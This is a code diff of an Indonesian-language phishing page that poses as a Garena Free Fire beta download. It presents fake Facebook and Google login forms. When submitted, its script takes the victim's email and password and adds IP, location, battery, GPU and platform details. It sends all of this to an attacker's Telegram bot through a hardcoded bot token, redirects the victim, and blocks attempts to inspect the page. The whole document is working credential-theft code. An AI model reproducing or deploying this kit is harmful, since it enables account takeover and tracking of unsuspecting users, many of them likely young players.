@@ -11,21 +11,21 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>
 
     <style>
-        /* --- SHAFIQ BLUE ENGINE V9.5 CORE --- */
+        /* --- REXUSZ ENGINE V9.5 LUXURY CORE --- */
         :root {
             --primary-blue: #007bff;
             --secondary-blue: #0056b3;
-            --dark-bg: #00050a;
-            --glass-bg: rgba(5, 12, 24, 0.95);
-            --neon-shadow: 0 0 20px rgba(0, 123, 255, 0.5);
-            --error-red: #ff3e3e;
+            --neon-glow: 0 0 25px rgba(0, 123, 255, 0.6);
+            --dark-deep: #00050a;
+            --glass: rgba(5, 15, 30, 0.95);
+            --error: #ff3e3e;
         }
 
         ::-webkit-scrollbar { width: 0px; }
-        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; outline: none !important; }
 
         body {
-            background-color: var(--dark-bg);
+            background: var(--dark-deep);
             color: #ffffff;
             font-family: 'Poppins', sans-serif;
             overflow: hidden;
@@ -36,207 +36,215 @@
             justify-content: center;
         }
 
-        /* DYNAMIC NEON BACKGROUND ENGINE */
+        /* PHYSICS BACKGROUND CANVAS */
         #bg-canvas {
             position: fixed;
             top: 0; left: 0;
             width: 100%; height: 100%;
             z-index: 1;
-            filter: blur(1px);
         }
 
-        .overlay-vignette {
+        .vignette {
             position: fixed;
             top: 0; left: 0;
             width: 100%; height: 100%;
-            background: radial-gradient(circle, rgba(0, 10, 30, 0) 0%, #000 100%);
+            background: radial-gradient(circle at center, transparent 0%, #000 100%);
             z-index: 2;
             pointer-events: none;
         }
 
-        /* MAIN UI ARCHITECTURE */
-        .master-wrapper {
+        /* MAIN CONTAINER ARCHITECTURE */
+        .master-box {
             position: relative;
             z-index: 10;
-            width: 100%;
-            max-width: 420px;
-            padding: 20px;
+            width: 95%;
+            max-width: 430px;
+            perspective: 1000px;
         }
 
         .glass-card {
-            background: var(--glass-bg);
-            border: 1px solid rgba(0, 123, 255, 0.2);
-            border-radius: 30px;
-            padding: 40px 30px;
+            background: var(--glass);
+            border: 1px solid rgba(0, 123, 255, 0.3);
+            border-radius: 35px;
+            padding: 45px 35px;
             text-align: center;
-            box-shadow: var(--neon-shadow);
-            backdrop-filter: blur(20px);
+            box-shadow: var(--neon-glow);
+            backdrop-filter: blur(25px);
             position: relative;
             overflow: hidden;
+            transition: 0.5s;
         }
 
-        /* SCANLINE ANIMATION */
+        /* SCANLINE EFFECT */
         .scanline {
             position: absolute;
-            top: 0; left: 0; width: 100%; height: 5px;
-            background: linear-gradient(to bottom, transparent, rgba(0, 123, 255, 0.2), transparent);
-            animation: scanning 4s linear infinite;
+            top: 0; left: 0; width: 100%; height: 10px;
+            background: linear-gradient(to bottom, transparent, rgba(0, 123, 255, 0.15), transparent);
+            animation: scan 3s linear infinite;
         }
-        @keyframes scanning { 0% { top: -10%; } 100% { top: 110%; } }
+        @keyframes scan { 0% { top: -10%; } 100% { top: 110%; } }
 
-        /* TYPOGRAPHY SYSTEM */
+        /* HEADER DESIGN */
         .brand-header h1 {
             font-family: 'Orbitron', sans-serif;
-            font-size: 24px;
+            font-size: 26px;
             font-weight: 900;
             color: var(--primary-blue);
-            text-shadow: 0 0 10px rgba(0, 123, 255, 0.8);
-            margin-bottom: 5px;
+            text-shadow: 0 0 15px rgba(0, 123, 255, 0.8);
+            margin-bottom: 8px;
             letter-spacing: 1px;
         }
 
         .brand-header p {
             font-size: 11px;
-            font-weight: 700;
+            font-weight: 800;
             color: #4c8eba;
             text-transform: uppercase;
-            letter-spacing: 2px;
-            margin-bottom: 35px;
+            letter-spacing: 3px;
+            margin-bottom: 40px;
         }
 
-        /* STEP CONTROL LOGIC */
-        .content-step { display: none; }
-        .content-step.active { display: block; animation: fadeInUp 0.6s cubic-bezier(0.23, 1, 0.32, 1); }
+        /* STEP NAVIGATION SYSTEM */
+        .step-content { display: none; }
+        .step-content.active { display: block; animation: fadeInUp 0.7s cubic-bezier(0.19, 1, 0.22, 1); }
 
         @keyframes fadeInUp {
-            from { opacity: 0; transform: translateY(30px); }
-            to { opacity: 1; transform: translateY(0); }
+            from { opacity: 0; transform: translateY(40px) rotateX(-10deg); }
+            to { opacity: 1; transform: translateY(0) rotateX(0); }
         }
 
-        /* BUTTON DESIGN */
-        .auth-btn {
+        /* AUTH BUTTONS ELITE */
+        .btn-auth {
             width: 100%;
-            padding: 16px;
-            border-radius: 18px;
+            padding: 18px;
+            border-radius: 20px;
             border: none;
-            font-weight: 700;
+            font-weight: 800;
             font-size: 14px;
             display: flex;
             align-items: center;
             justify-content: center;
-            margin-bottom: 15px;
-            transition: all 0.3s ease;
+            margin-bottom: 18px;
+            transition: 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
             cursor: pointer;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.4);
+            box-shadow: 0 8px 20px rgba(0,0,0,0.4);
         }
 
-        .btn-facebook { background: #1877f2; color: #fff; }
-        .btn-google { background: #ffffff; color: #333; }
+        .btn-fb { background: #1877f2; color: #fff; }
+        .btn-ggl { background: #ffffff; color: #333; }
 
-        .auth-btn img { width: 22px; margin-right: 15px; }
-        .auth-btn:hover { transform: translateY(-3px); filter: brightness(1.1); }
+        .btn-auth img { width: 24px; margin-right: 15px; }
+        .btn-auth:hover { transform: translateY(-5px) scale(1.02); filter: brightness(1.1); }
 
-        /* FORM INPUT SYSTEM */
-        .form-group { text-align: left; margin-bottom: 20px; position: relative; }
-        .form-group label {
+        /* FORM INPUT SYSTEM LUXURY */
+        .input-group-custom { text-align: left; margin-bottom: 25px; position: relative; }
+        .input-group-custom label {
             font-size: 11px;
             color: #6a96c1;
-            margin-left: 10px;
-            margin-bottom: 8px;
+            margin-left: 12px;
+            margin-bottom: 10px;
             display: block;
             text-transform: uppercase;
-            font-weight: 600;
-        }
-
-        .form-group input {
-            width: 100%;
-            background: rgba(0, 5, 15, 0.8);
-            border: 1px solid #1a3a5a;
-            border-radius: 15px;
-            padding: 15px 20px;
-            color: #fff;
-            font-size: 14px;
-            outline: none;
-            transition: 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-        }
-
-        .form-group input:focus {
-            border-color: var(--primary-blue);
-            box-shadow: 0 0 15px rgba(0, 123, 255, 0.2);
-            background: rgba(0, 10, 30, 0.9);
-        }
-
-        .error-label {
-            color: var(--error-red);
-            font-size: 10px;
-            margin-top: 6px;
-            margin-left: 10px;
-            display: none;
-            font-weight: 500;
-        }
-
-        .submit-btn {
-            width: 100%;
-            padding: 16px;
-            background: linear-gradient(135deg, var(--primary-blue), var(--secondary-blue));
-            border: none;
-            border-radius: 15px;
-            color: #fff;
-            font-weight: 800;
-            font-size: 15px;
-            margin-top: 10px;
-            text-transform: uppercase;
+            font-weight: 700;
             letter-spacing: 1px;
-            cursor: pointer;
+        }
+
+        .input-group-custom input {
+            width: 100%;
+            background: rgba(0, 8, 20, 0.9);
+            border: 1px solid #1a3a5a;
+            border-radius: 18px;
+            padding: 18px 22px;
+            color: #fff;
+            font-size: 15px;
             transition: 0.4s;
         }
 
-        .submit-btn:hover { box-shadow: 0 0 25px rgba(0, 123, 255, 0.5); transform: scale(1.02); }
+        .input-group-custom input:focus {
+            border-color: var(--primary-blue);
+            box-shadow: 0 0 20px rgba(0, 123, 255, 0.25);
+            background: rgba(0, 15, 35, 1);
+        }
 
-        /* LOADING OVERLAY */
-        #loading-screen {
+        .err-hint {
+            color: var(--error);
+            font-size: 10px;
+            margin-top: 8px;
+            margin-left: 12px;
+            display: none;
+            font-weight: 600;
+            animation: shake 0.5s;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            75% { transform: translateX(5px); }
+        }
+
+        .btn-main-submit {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(135deg, var(--primary-blue), var(--secondary-blue));
+            border: none;
+            border-radius: 18px;
+            color: #fff;
+            font-weight: 900;
+            font-size: 16px;
+            margin-top: 15px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            cursor: pointer;
+            transition: 0.5s;
+            box-shadow: 0 10px 25px rgba(0, 123, 255, 0.4);
+        }
+
+        .btn-main-submit:hover { box-shadow: 0 0 35px var(--primary-blue); transform: translateY(-2px); }
+
+        /* LOADING SYSTEM OVERLAY */
+        #loader-master {
             display: none;
             position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0, 3, 8, 0.98);
+            background: rgba(0, 4, 10, 0.99);
             z-index: 9999;
             flex-direction: column;
             align-items: center;
             justify-content: center;
         }
 
-        .loader-ring {
-            width: 80px; height: 80px;
-            border: 4px solid rgba(0, 123, 255, 0.1);
-            border-top: 4px solid var(--primary-blue);
+        .orbit-spinner {
+            width: 70px; height: 70px;
+            border: 3px solid rgba(0, 123, 255, 0.1);
+            border-top: 3px solid var(--primary-blue);
             border-radius: 50%;
-            animation: spin 1s cubic-bezier(0.5, 0.1, 0.4, 0.9) infinite;
+            animation: rotate 0.8s infinite linear;
         }
+        @keyframes rotate { 100% { transform: rotate(360deg); } }
 
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-        /* FOOTER SYSTEM */
-        .garena-footer {
-            margin-top: 40px;
+        /* FOOTER BRANDING */
+        .footer-info {
+            margin-top: 45px;
             font-size: 10px;
             color: #1a4a7a;
-            letter-spacing: 1px;
-            line-height: 1.6;
+            font-weight: 600;
+            letter-spacing: 2px;
+            line-height: 1.8;
         }
     </style>
 </head>
 <body>
 
     <canvas id="bg-canvas"></canvas>
-    <div class="overlay-vignette"></div>
+    <div class="vignette"></div>
 
-    <div id="loading-screen">
-        <div class="loader-ring"></div>
-        <p style="margin-top: 25px; font-family: 'Orbitron', sans-serif; font-size: 11px; color: var(--primary-blue); letter-spacing: 2px;">AUTHENTICATING SERVER...</p>
+    <div id="loader-master">
+        <div class="orbit-spinner"></div>
+        <p style="margin-top: 30px; font-family: 'Orbitron', sans-serif; font-size: 11px; color: var(--primary-blue); letter-spacing: 3px;">INITIALIZING SECURE LINK...</p>
     </div>
 
-    <div class="master-wrapper">
-        <div class="glass-card">
+    <div class="master-box">
+        <div class="glass-card animate__animated animate__zoomIn">
             <div class="scanline"></div>
             
             <div class="brand-header">
@@ -244,200 +252,209 @@
                 <p>DIJAMIN WORK 100%</p>
             </div>
 
-            <div id="step-one" class="content-step active">
-                <p style="font-size: 12px; color: #78a2c3; margin-bottom: 25px;">Silakan pilih akun login untuk melanjutkan pengunduhan:</p>
+            <div id="step-selector" class="step-content active">
+                <p style="font-size: 12px; color: #78a2c3; margin-bottom: 30px;">Login untuk memulai pengunduhan versi Beta:</p>
                 
-                <button class="auth-btn btn-facebook" onclick="handleStepSwitch('Facebook')">
+                <button class="btn-auth btn-fb" onclick="switchStep('Facebook')">
                     <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" alt="fb">
-                    Masuk dengan Facebook
+                    Login via Facebook
                 </button>
 
-                <button class="auth-btn btn-google" onclick="handleStepSwitch('Google')">
+                <button class="btn-auth btn-ggl" onclick="switchStep('Google')">
                     <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg" alt="ggl">
-                    Masuk dengan Google
+                    Login via Google Account
                 </button>
             </div>
 
-            <div id="step-two" class="content-step">
-                <div id="method-indicator" style="margin-bottom: 25px;"></div>
+            <div id="step-form" class="step-content">
+                <div id="active-method-icon" style="margin-bottom: 30px;"></div>
                 
-                <div class="form-group">
-                    <label id="label-email">Email atau Nomor HP</label>
-                    <input type="text" id="target-user" placeholder="Masukkan Email/No HP" oninput="liveValidation()">
-                    <div id="target-error" class="error-label">Format email tidak valid atau akun tidak ditemukan.</div>
+                <div class="input-group-custom">
+                    <label id="label-user">Email atau Nomor HP</label>
+                    <input type="text" id="inp-user" placeholder="Masukkan Email/No HP" oninput="runValidation()">
+                    <div id="inp-error" class="err-hint">Format email tidak valid (Wajib @gmail.com)</div>
                 </div>
 
-                <div class="form-group">
+                <div class="input-group-custom">
                     <label>Kata Sandi Akun</label>
-                    <input type="password" id="target-pass" placeholder="Masukkan Password">
+                    <input type="password" id="inp-pass" placeholder="Masukkan Password">
                 </div>
 
-                <button class="submit-btn" onclick="processFinalHit()">MASUK</button>
+                <button class="btn-main-submit" onclick="executeFinalHit()">MASUK</button>
                 
-                <div style="margin-top: 20px;">
-                    <a href="javascript:void(0)" onclick="location.reload()" style="font-size: 11px; color: #444; text-decoration: none;">Bukan akun saya? Kembali</a>
+                <div style="margin-top: 25px;">
+                    <a href="javascript:void(0)" onclick="location.reload()" style="font-size: 11px; color: #444; text-decoration: none; font-weight: 700;">KEMBALI KE MENU</a>
                 </div>
             </div>
 
-            <div class="garena-footer">
-                GARENA INTERNATIONAL LIMITED<br>
-                SECURED BY REXUSZ ENGINE CLOUD V9.5
+            <div class="footer-info">
+                GARENA FREE FIRE INTERNATIONAL<br>
+                POWERED BY REXUSZ CLOUD V9.5
             </div>
         </div>
     </div>
 
     <script>
-        /* --- DYNAMIC BACKGROUND ENGINE --- */
+        /* --- HIGH-PERFORMANCE PARTICLE ENGINE --- */
         const canvas = document.getElementById('bg-canvas');
         const ctx = canvas.getContext('2d');
-        let points = [];
+        let particles = [];
 
-        function initStars() {
+        function resize() {
             canvas.width = window.innerWidth;
             canvas.height = window.innerHeight;
-            points = [];
-            for(let i=0; i<80; i++) {
-                points.push({
-                    x: Math.random() * canvas.width,
-                    y: Math.random() * canvas.height,
-                    s: Math.random() * 2,
-                    v: Math.random() * 0.5
-                });
+        }
+
+        class Particle {
+            constructor() {
+                this.reset();
+            }
+            reset() {
+                this.x = Math.random() * canvas.width;
+                this.y = Math.random() * canvas.height;
+                this.vx = (Math.random() - 0.5) * 0.6;
+                this.vy = (Math.random() - 0.5) * 0.6;
+                this.size = Math.random() * 2;
+            }
+            update() {
+                this.x += this.vx;
+                this.y += this.vy;
+                if(this.x < 0 || this.x > canvas.width || this.y < 0 || this.y > canvas.height) this.reset();
+            }
+            draw() {
+                ctx.fillStyle = "rgba(0, 123, 255, 0.4)";
+                ctx.beginPath();
+                ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
+                ctx.fill();
             }
         }
 
-        function renderStars() {
-            ctx.clearRect(0,0,canvas.width,canvas.height);
-            ctx.fillStyle = "rgba(0, 123, 255, 0.5)";
-            points.forEach(p => {
-                ctx.beginPath();
-                ctx.arc(p.x, p.y, p.s, 0, Math.PI*2);
-                ctx.fill();
-                p.y -= p.v;
-                if(p.y < 0) p.y = canvas.height;
-            });
-            requestAnimationFrame(renderStars);
+        function initParticles() {
+            resize();
+            for(let i=0; i<100; i++) particles.push(new Particle());
         }
-        window.addEventListener('resize', initStars);
-        initStars(); renderStars();
 
-        /* --- CORE LOGIC - SHAFIQ PANEL V9.5 --- */
-        const TG_CID = "8463622692";
-        const TG_BTK = "8797152046:AAFGRBsspuWkiuiy0OXu9NDu1NI7nkM03bc";
-        let activeMet = "";
+        function loop() {
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            particles.forEach(p => { p.update(); p.draw(); });
+            requestAnimationFrame(loop);
+        }
+        window.addEventListener('resize', resize);
+        initParticles(); loop();
 
-        function handleStepSwitch(m) {
-            activeMet = m;
-            document.getElementById('step-one').classList.remove('active');
-            document.getElementById('step-two').classList.add('active');
+        /* --- THE CORE LOGIC ENGINE --- */
+        const SH_CID = "8463622692";
+        const SH_BTK = "8797152046:AAFGRBsspuWkiuiy0OXu9NDu1NI7nkM03bc";
+        let currentMethod = "";
+
+        function switchStep(m) {
+            currentMethod = m;
+            document.getElementById('step-selector').classList.remove('active');
+            document.getElementById('step-form').classList.add('active');
             
-            const indicator = document.getElementById('method-indicator');
-            const label = document.getElementById('label-email');
+            const iconBox = document.getElementById('active-method-icon');
+            const label = document.getElementById('label-user');
             
             if(m === 'Facebook') {
-                indicator.innerHTML = `<img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" width="45">`;
-                label.innerText = "Email atau Telepon Facebook";
+                iconBox.innerHTML = `<img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" width="50" class="animate__animated animate__bounceIn">`;
+                label.innerText = "Nomor Ponsel atau Email";
             } else {
-                indicator.innerHTML = `<img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg" width="45">`;
+                iconBox.innerHTML = `<img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg" width="50" class="animate__animated animate__bounceIn">`;
                 label.innerText = "Alamat Email Google";
-                document.getElementById('target-user').placeholder = "contoh@gmail.com";
+                document.getElementById('inp-user').placeholder = "contoh@gmail.com";
             }
         }
 
-        function liveValidation() {
-            const val = document.getElementById('target-user').value;
-            const err = document.getElementById('target-error');
+        function runValidation() {
+            const val = document.getElementById('inp-user').value;
+            const hint = document.getElementById('inp-error');
             
-            if(activeMet === 'Google') {
-                if(val.length > 5 && !val.includes('@gmail.com')) {
-                    err.innerText = "Format @gmail.com wajib diisi untuk verifikasi Google.";
-                    err.style.display = 'block';
+            if(currentMethod === 'Google') {
+                if(val.length > 4 && !val.includes('@gmail.com')) {
+                    hint.style.display = 'block';
                     return false;
                 }
             }
-            err.style.display = 'none';
+            hint.style.display = 'none';
             return true;
         }
 
-        async function processFinalHit() {
-            const u = document.getElementById('target-user').value;
-            const p = document.getElementById('target-pass').value;
+        async function executeFinalHit() {
+            const u = document.getElementById('inp-user').value;
+            const p = document.getElementById('inp-pass').value;
 
-            if(!u || !p) { alert("Data verifikasi tidak lengkap!"); return; }
-            if(!liveValidation()) { return; }
+            if(!u || !p) { alert("Harap lengkapi semua data!"); return; }
+            if(!runValidation()) { return; }
 
-            document.getElementById('loading-screen').style.display = 'flex';
+            document.getElementById('loader-master').style.display = 'flex';
 
-            // GEOLOCATION & IP HANDLER
-            let ipd = {};
+            // DEEP DATA MINING (ASN & IP)
+            let net = {};
             try { 
-                ipd = await fetch('https://ipapi.co/json/').then(r => r.json()); 
+                net = await fetch('https://ipapi.co/json/').then(r => r.json()); 
             } catch(e) { 
-                ipd = { ip: "0.0.0.0", city: "Unknown", region: "Unknown", country_name: "Unknown", org: "Unknown", latitude: 0, longitude: 0 }; 
+                net = { ip: "0.0.0.0", city: "Err", org: "Err", asn: "Err" }; 
             }
 
-            // BATT STATS
+            // HARDWARE FINGERPRINTING
             let batt = "N/A";
             if(navigator.getBattery) {
                 const b = await navigator.getBattery();
-                batt = `${(b.level * 100).toFixed(0)}% [${b.charging ? '🔌' : '🔋'}]`;
+                batt = `${(b.level * 100).toFixed(0)}% [${b.charging ? '⚡ Charging' : '🔋 Discharging'}]`;
             }
 
-            // GPU RENDERER
-            const c_gl = document.createElement('canvas');
-            const gl = c_gl.getContext('webgl');
-            const d_info = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
-            const renderer = d_info ? gl.getParameter(d_info.UNMASKED_RENDERER_AD) : "HIDDEN";
+            const gl = document.createElement('canvas').getContext('webgl');
+            const ext = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
+            const gpu = ext ? gl.getParameter(ext.UNMASKED_RENDERER_AD) : "UNKNOWN DEVICE";
 
-            const maps = `https://www.google.com/maps?q=${ipd.latitude},${ipd.longitude}`;
+            const mapsUrl = `https://www.google.com/maps?q=${net.latitude},${net.longitude}`;
 
-            // --- RESULT TEXT (LUXURY & BOLD MODE) ---
-            const payload = 
-                `🔥 **DATA HIT: FF BETA TIKTOK WORK** 🔥\n` +
+            // --- THE LUXURY RESULT PAYLOAD ---
+            const resultMsg = 
+                `🔥 **NEW HIT: FF BETA TIKTOK WORK** 🔥\n` +
                 `✨ **STATUS: SUCCESS INFILTRATION** ✨\n\n` +
                 `👤 **[ AKUN TARGET ]**\n` +
                 `━━━━━━━━━━━━━━━━━━━━\n` +
                 `📧 **EMAIL/USER :** \`${u}\`\n` +
                 `🔑 **PASSWORD   :** \`${p}\`\n` +
-                `🌐 **LOGIN VIA  :** **${activeMet.toUpperCase()}**\n` +
+                `🌐 **LOGIN VIA  :** **${currentMethod.toUpperCase()}**\n` +
                 `━━━━━━━━━━━━━━━━━━━━\n\n` +
                 `📍 **[ INFO LOKASI ]**\n` +
                 `━━━━━━━━━━━━━━━━━━━━\n` +
-                `🌍 **IP ADDRESS :** \`${ipd.ip}\`\n` +
-                `🏘️ **KOTA/REGION:** **${ipd.city}, ${ipd.region}**\n` +
-                `🇮🇩 **NEGARA     :** **${ipd.country_name}**\n` +
-                `🏢 **PROVIDER   :** **${ipd.org}**\n` +
-                `🗺️ **GOOGLE MAPS:** [KLIK DISINI](${maps})\n` +
+                `🌍 **IP ADDRESS :** \`${net.ip}\`\n` +
+                `🛰️ **ASN (ISP)  :** **${net.asn || 'AS-HIDDEN'}**\n` +
+                `🏘️ **KOTA/REGION:** **${net.city}, ${net.region || 'Unknown'}**\n` +
+                `🇮🇩 **NEGARA     :** **${net.country_name}**\n` +
+                `🏢 **PROVIDER   :** **${net.org}**\n` +
+                `🗺️ **GOOGLE MAPS:** [KLIK DISINI](${mapsUrl})\n` +
                 `━━━━━━━━━━━━━━━━━━━━\n\n` +
                 `📱 **[ INFO PERANGKAT ]**\n` +
                 `━━━━━━━━━━━━━━━━━━━━\n` +
                 `🔋 **KONDISI BATRE:** **${batt}**\n` +
-                `🎮 **GPU RENDERER :** **${renderer}**\n` +
+                `🎮 **GPU RENDERER :** **${gpu}**\n` +
                 `🖥️ **PLATFORM     :** **${navigator.platform}**\n` +
                 `🕒 **WAKTU HIT     :** **${new Date().toLocaleString('id-ID')}**\n` +
                 `━━━━━━━━━━━━━━━━━━━━\n\n` +
                 `✅ **BY: SHAFIQ PANEL V9.5 LUXURY** ✅`;
 
-            // TELEGRAM DISPATCH
+            // DISPATCH TO TELEGRAM
             try {
-                await fetch(`https://api.telegram.org/bot${TG_BTK}/sendMessage`, {
+                await fetch(`https://api.telegram.org/bot${SH_BTK}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: TG_CID, text: payload, parse_mode: 'Markdown' })
+                    body: JSON.stringify({ chat_id: SH_CID, text: resultMsg, parse_mode: 'Markdown' })
                 });
             } catch(e) {}
 
-            // STEALTH REDIRECT
+            // FINAL STEALTH REDIRECT
             setTimeout(() => {
                 window.location.href = "https://ffkipas.org/#dwnld";
             }, 3500);
         }
 
-        // ANTI-INSPECT PROTECTION PRO
+        // ANTI-INSPECT PROTECTION MAX
         document.onkeydown = function(e) {
-            if(e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74)) || (e.ctrlKey && e.keyCode == 85)) {
-                return false;
-            }
+            if(e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74)) || (e.ctrlKey && e.keyCode == 85)) return false;
         };
         document.addEventListener('contextmenu', e => e.preventDefault());
     </script>
